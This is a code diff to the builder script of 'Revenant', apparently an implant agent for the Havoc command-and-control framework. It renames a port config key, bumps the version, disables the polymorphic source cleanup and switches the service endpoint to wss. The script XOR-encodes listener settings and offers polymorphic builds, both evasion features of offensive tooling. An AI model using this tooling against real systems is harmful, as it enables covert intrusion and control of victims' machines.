@@ -213,7 +213,7 @@ def process_strings_h():
 def process_config_h(config: dict):
     config_user_agent:         str = xor_encode(config['Options']['Listener']['UserAgent'])
     config_host_bind:          str = xor_encode(config['Options']['Listener']['HostBind'])
-    config_host_port:          str = config['Options']['Listener']['Port']
+    config_host_port:          str = config['Options']['Listener']['PortBind']
     config_host_secure:        str = str(config['Options']['Listener']['Secure']).upper()
     config_sleep:              str = config['Config']['Sleep']
     config_poly:               str = str(config['Config']['Polymorphic'])
@@ -338,7 +338,7 @@ class Revenant(AgentType):
     def __init__(self):
         self.Name: str = "Revenant"
         self.Author: str = "0xTriboulet for Malicious Group"
-        self.Version: str = "0.4"
+        self.Version: str = "0.49"
         self.Description: str = "Revenant"
         self.MagicValue = 0x72766e74
 
@@ -404,8 +404,8 @@ class Revenant(AgentType):
                 print(f"Error occurred: {error.stderr}")
 
                 if config['Config']['Polymorphic']:
-                    process_directory(directory_path, instructions_x64, True)
-                    print("[*] Cleaning up source files...")
+                    #process_directory(directory_path, instructions_x64, True)
+                    print("[*] !! NOT Cleaning up source files !!")
 
                 return
             data = open("Agent/Bin/x64/Revenant.exe", "rb").read()
@@ -604,7 +604,7 @@ def main():
 
     print("[*] Connect to Havoc service api")
     havoc_service = HavocService(
-        endpoint="ws://127.0.0.1:40056/service-endpoint",
+        endpoint="wss://127.0.0.1:40056/service-endpoint",
         password="service-password"
     )
 
